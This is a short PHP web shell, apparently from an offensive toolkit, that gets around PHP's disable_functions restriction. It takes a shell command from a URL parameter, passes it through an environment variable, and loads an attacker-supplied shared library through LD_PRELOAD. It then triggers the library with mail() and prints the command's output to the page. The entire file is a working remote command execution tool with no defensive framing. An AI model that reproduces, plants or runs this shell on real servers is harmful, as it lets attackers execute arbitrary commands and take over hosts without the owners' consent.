<?php
	echo "example : http://site.com/shell.php?outpath=any_temp&sopath=/path/to/so/bypass.so&cmd=id";
	$cmd = $_GET["cmd"];
	$out_path = $_GET["outpath"];
	$payload = $cmd . " > ". $out_path . " 2>&1";
	echo "<br/>cmdline : " .$payload;
	
	putenv("EVIL_CMDLINE=".$payload);
	$so_path = $_GET["sopath"];
	putenv("LD_PRELOAD=".$so_path);
	
	mail("a","a","a","a");
	echo "<br /> output : ".nl2br(file_get_contents($out_path));
	
?>